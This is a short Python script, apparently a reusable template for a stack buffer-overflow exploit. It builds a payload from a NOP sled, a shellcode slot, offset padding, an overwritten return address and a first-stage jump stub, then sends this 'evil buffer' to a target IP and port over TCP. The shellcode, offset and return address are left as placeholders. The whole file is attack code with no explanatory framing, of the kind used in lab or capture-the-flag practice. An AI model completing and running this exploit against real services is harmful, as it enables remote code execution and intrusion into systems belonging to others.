#!/usr/bin/env python3
import socket

ip = "MACHINE_IP"
port = MACHINE_PORT
padding = "\x90" * 16 #nops
payload = ("<ShellCode>")

prefix = "<buffer_string>" # netcat data
offset = <offset_length>
overflow = "A" * (offset - len(padding) -len(payload))
retn = "<return_address>"
first_stage = "opcode from nasm" + "\x90" * (<crash_length> - <offset_length> - 4 - 4)

postfix = ""

buffer = prefix + padding + payload + overflow + retn + first_stage + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")